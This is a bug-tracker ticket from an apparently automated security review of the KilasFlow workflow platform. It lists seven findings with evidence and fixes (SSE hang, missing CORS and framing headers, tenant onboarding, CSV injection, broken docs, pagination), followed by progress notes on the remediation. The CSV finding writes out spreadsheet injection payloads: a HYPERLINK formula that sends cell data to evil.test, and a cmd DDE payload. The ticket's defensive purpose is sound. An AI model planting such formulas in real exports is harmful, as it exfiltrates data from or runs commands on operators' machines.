---
id: BUG-fv5fer
title: 'Event-stream/CORS/tenancy gaps: SSE hang, CORS, onboarding, headers, CSV, pagination'
status: testing
priority: medium
labels:
    - security
    - api
    - full-review
    - wf-c415e773
parent: EPIC-cfe7ny
created: "2026-09-19T12:06:09Z"
updated: "2026-09-20T00:53:27Z"
---

Source: KilasFlow full-review workflow `wf_c415e773-4e1` (Find 14/14 + Verify 14/14 + Critique 1/1). Evidence: live repros against stub/n8n/private instances in `scratchpad/work/<dim>/` (FINDINGS.md, PROGRESS.md) plus journal `wf_c415e773-4e1/journal.jsonl`. Excluded from this epic: 10 verifier-refuted/tracked items (documented bounds, already-open FEAT-1axhdn/FEAT-8mymac halves).

Consolidates 7 finding(s) from dims: find:api-security-tenancy.

---
### Execution event stream never ends for finished/unknown executions (SSE hangs forever) [find:api-security-tenancy] (medium/bug) · area: API /executions/{id}/events · confidence: high

StreamEvents subscribes without reading the durable record (except for embed sessions), so a stream for a finished, restart-lost, or entirely nonexistent execution id stays open indefinitely, emitting only heartbeats and never a terminal event.

Evidence: Private :8107 with tenant API key: GET /executions/exec_totally_bogus_id/events -> 200 and held open (curl -m 3 timed out at 3.0s). Same for an execution that finished before a server restart. A fresh run instead replays events and closes on the terminal event. Handler comment claims the durable record is read first, but that read only happens for embed sessions.

Impact: Editor/SDK subscribers to an old run (after a restart, or in an api/worker split where the API broker missed the events) spin forever; any caller can pin unbounded open SSE goroutines against arbitrary/nonexistent ids.

Suggested fix: Load the execution tenant-scoped before subscribing: 404 unknown ids; if the run is already terminal (and no retained events remain after ?from), emit a synthetic terminal event with the final status and close; cap concurrent streams per principal.

Files: internal/api/handlers/executions.go, internal/events/events.go

---
### Documented cross-origin event streaming can't work: the API sends no CORS headers [find:api-security-tenancy] (medium/bug) · area: API / SDK / embedding · confidence: high

The embedding guide and SDK call subscribeExecutionEvents from the host page (a different, embed-allowed origin) using a stream ticket, but the events endpoint (and the API generally) emits no Access-Control-Allow-Origin, so the browser blocks it — and the blocked request still spends the single-use ticket.

Evidence: Real browser (playwright) on http://127.0.0.1:8097 opening EventSource to http://127.0.0.1:8107/api/v1/executions/<id>/events?ticket=<fresh> -> console 'blocked by CORS policy: No Access-Control-Allow-Origin header'; server still logged the request (ticket consumed). OPTIONS preflight to /api/v1/* returns 401 from the auth gate. No Access-Control-* handling exists in internal/ or cmd/. docs/src/content/docs/guides/embedding.md step 4 and sdk/README.md:207 document this exact cross-origin usage.

n8n behavior: N/A.

Impact: The advertised embed observability path is broken for any real cross-origin host; the ticket is burned on each blocked attempt.

Suggested fix: Add a CORS layer (reflecting only embed.allowed_origins, answering preflight before auth, no-credentials) for the events endpoint, or change docs/SDK to stream inside the iframe and forward via postMessage.

Files: internal/api/server.go, internal/api/middleware/auth.go, sdk/src/browser.ts, docs/src/content/docs/guides/embedding.md

---
### No product path to onboard a second tenant or user (multi-tenant/white-label requires raw SQL) [find:api-security-tenancy] (medium/unfinished) · area: identity / tenancy API · confidence: high

The API exposes only login/logout/me, api-keys (caller's tenant only), and stream-tickets — no tenant, user, invitation, password-change, or user-disable operations. A tenant can only be created by seeding a DB row and users only by the one-time bootstrap, so the flagship multi-tenant embedding scenario cannot be provisioned through the product.

Evidence: OpenAPI lists no /tenants or /users. /api-keys mints only for the caller's tenant; CreateUser runs only when zero users exist (bootstrap). docs concepts/tenancy-and-embedding.md:270 'Nothing creates a tenant through the API'; sdk/examples/reference-host/README.md:39-46 instructs operators to run INSERT INTO tenants and call store-layer CreateUser/CreateAPIKey (not reachable via the shipped binary). This audit had to insert tenant-b + its user with sqlite3 to get a second tenant.

n8n behavior: n8n has owner-driven user invitation, roles, password reset/disable, and a /users public API.

Impact: An operator running the distributed binary cannot stand up a second tenant, invite users, rotate/disable accounts, or reset passwords without direct DB access — a gap for the multi-tenant white-label goal.

Suggested fix: Add an operator-scoped admin surface (at minimum a `kilasflow tenant/user/key` CLI; ideally an operator/root API-key role for POST /tenants, tenant key minting, and user CRUD/password change).

Files: internal/api/handlers/auth.go, internal/repository/auth.go, cmd/kilasflow/main.go

---
### SPA and /embed pages send no clickjacking or content-type-hardening headers [find:api-security-tenancy] (low/security) · area: web handler · confidence: high

The dashboard SPA and /embed pages return no Content-Security-Policy frame-ancestors, X-Frame-Options, X-Content-Type-Options, or Referrer-Policy, so the dashboard can be framed by any page and /embed by non-allowlisted origins (the config already knows embed.allowed_origins).

Evidence: curl -D - http://127.0.0.1:8107/app/workflows and /embed/<id> return only Content-Type + X-Request-Id. By contrast /docs already emits a full CSP with frame-ancestors 'self'.

n8n behavior: N/A.

Impact: Clickjacking of destructive dashboard actions (a same-site sibling host receives the Lax session cookie); /embed framable outside its allowlist.

Suggested fix: web.Handler should emit frame-ancestors 'self' (+X-Frame-Options: SAMEORIGIN) for /app, frame-ancestors of embed.allowed_origins for /embed, and nosniff + Referrer-Policy on all.

Files: internal/web/handler.go, internal/api/routes.go

---
### CSV export performs no formula-injection neutralisation [find:api-security-tenancy] (low/security) · area: datastores CSV export · confidence: high

Datastore CSV export writes cell text verbatim, so a value beginning with = + - @ (which can arrive from untrusted webhook input into a datastore) becomes an active formula when the operator opens the exported sheet in Excel/Sheets.

Evidence: Wrote rows note='=HYPERLINK("http://evil.test/"&A1,"click")' and note="+cmd|'/C calc'!A0" via POST /datastores/{id}/rows, then GET /datastores/{id}/rows/export returned them unmodified (quoting escapes only quotes, not the leading =). csvExportCell (datastores_csv.go) returns strings unchanged.

n8n behavior: N/A.

Impact: Spreadsheet formula injection / data exfiltration against the host operator who exports and opens a datastore populated (partly) by external input.

Suggested fix: Prefix any cell beginning with = + - @ tab or CR with a single quote (OWASP CSV-injection mitigation) on export; add a test.

Files: internal/api/handlers/datastores_csv.go

Existing tickets: FEAT-t26rt7

---
### reference-host onboarding docs are broken (wrong bootstrap env var, missing image, wrong key format) [find:api-security-tenancy] (low/docs) · area: sdk/examples/reference-host · confidence: high

The multi-tenant reference-host README's setup commands won't work: it uses KILASFLOW_BOOTSTRAP_EMAIL (loader reads KILASFLOW_AUTH_BOOTSTRAP_EMAIL) so no owner is created and the next login fails; the docker run has no image argument; and it shows keys as 'kfa1.…' while real keys are 'kfa1_<prefix>_<secret>'. No embed signing key/origin is set although step 4 embeds the editor.

Evidence: sdk/examples/reference-host/README.md:23-27 (`-e KILASFLOW_BOOTSTRAP_EMAIL=...`, docker run ends in backslash+comment, no image), :51-52 ('kfa1.…'). Correct name in config.example.yaml:168 and docs/install.md:119; real format in internal/auth/keys.go (KeyVersion+'_').

n8n behavior: N/A.

Impact: A user following the flagship multi-tenant example cannot bring it up; erodes trust in the embedding story.

Suggested fix: Fix env var names, add an image tag and KILASFLOW_EMBED_SIGNING_KEY/KILASFLOW_EMBED_ALLOWED_ORIGINS, fix the key format; add a doc test that greps env names against the config reference.

Files: sdk/examples/reference-host/README.md

---
### Tenant list endpoints are unpaginated and load full documents [find:api-security-tenancy] (low/perf) · area: api list handlers / repository · confidence: high

GET /workflows, /credentials, /datastores, /schedules, and /api-keys have no limit/cursor and return every row in the tenant; the workflow list additionally loads each workflow's latest version document, inconsistent with /executions and /workflows/{id}/versions which cap at 100.

Evidence: GET /workflows?limit=1000000 -> 200 returning all rows (no limit param in OpenAPI); GORMWorkflowStore.List has no LIMIT and calls storedWorkflow (loads each latest document). Same unbounded pattern in credentials/datastores/schedules/api-keys handlers.

n8n behavior: n8n paginates list endpoints.

Impact: A tenant with many workflows makes every list load all documents into memory; on a shared host one abusive tenant can degrade the process.

Suggested fix: Add limit+keyset-cursor pagination to these lists (as executions already has) and drop the full document from the workflow list DTO.

Files: internal/api/handlers/workflows.go, internal/repository/workflows.go, internal/api/handlers/credentials.go, internal/api/handlers/datastores.go

## Acceptance criteria

- [ ] Execution event stream never ends for finished/unknown executions (SSE hangs forever)
- [ ] Documented cross-origin event streaming can't work: the API sends no CORS headers
- [ ] No product path to onboard a second tenant or user (multi-tenant/white-label requires raw SQL)
- [ ] SPA and /embed pages send no clickjacking or content-type-hardening headers
- [ ] CSV export performs no formula-injection neutralisation
- [ ] reference-host onboarding docs are broken (wrong bootstrap env var, missing image, wrong key format)
- [ ] Tenant list endpoints are unpaginated and load full documents
- [ ] Adversarial re-verify against live stub/n8n like the Verify phase (no code-only close)
## Progress 2026-09-19 (SecurityDx)
- Status: doing. Research + partial implementation done this session.

## Progress 2026-09-19 (SecurityFront2) — mostly landed, still doing
Status: doing (three of seven findings landed by me + two agents this wave).
- SSE hang (finding 1) — LANDED by me, see BUG-y57cz4 for the detail: the durable
  record is read before the stream opens (real 404 for unknown ids and for another
  workflow's execution), a finished run with nothing left to replay emits a
  reconstructed terminal frame and closes, a broker-dropped stream does the same, and
  concurrent streams are capped at 32 per tenant. No scoped test run yet (sibling
  packages were mid-edit); re-run `go test ./internal/api/ -run Events`.
- CORS (finding 2) — LANDED: internal/api/middleware/cors.go by agent ApiLists (commit
  69e7f02), mounted by me in internal/api/server.go BEFORE the auth gate so a preflight
  (which carries no credential by definition) is answered; reflects only
  embed.allowed_origins, answers OPTIONS 204, never allows credentials.
- Framing headers (finding 4) — LANDED by ApiLists in internal/web/embed.go:
  frame-ancestors 'self' for /app, the configured allowlist for /embed (X-Frame-Options
  omitted there because it cannot express a list), nosniff + Referrer-Policy everywhere.
  Wired in internal/api/routes.go by ApiLists.
- CSV formula neutralisation (finding 5) — LANDED by ApiLists in
  internal/api/handlers/datastores_csv.go.
- Pagination (finding 7) — LANDED by ApiLists for workflows (ListSummaries), schedules
  (ListPage) and datastores (ListDatastoresPage): limit (1..500, default 100) + keyset
  cursor, body shape unchanged, next cursor in the X-Next-Cursor header so the
  SvelteKit dashboard keeps working, ErrInvalidCursor -> 400. NOT done: credentials.go
  (mine — pattern recorded in BUG-y57cz4) and api-keys in internal/api/handlers/auth.go
  (AuthHardening's file).
- Onboarding (finding 3) — LANDED by agent TenancyAdmin (commit ca313a9): operator-only
  admin surface, GET/POST /tenants, GET/POST /tenants/{id}/users,
  POST /tenants/{id}/users/{userId}/disable|enable|password, POST /tenants/{id}/api-keys.
  Gate is key-only on the operator tenant; a customer key, a customer session, an
  operator-tenant session and no identity are each 403 on all 9 routes; an embed token
  is refused by permits()'s default deny. The operator key is registered at boot from
  KILASFLOW_AUTH_OPERATOR_KEY (config + main.go wiring landed by me).
- Docs (finding 6) — reference-host README is owned by DXOps2; the corrected text was
  handed to them via hub by TenancyAdmin. Not yet confirmed landed.
Unverified: no scoped test re-run for the SSE half from my side; ApiLists' and
TenancyAdmin's own scoped tests are green per their reports.
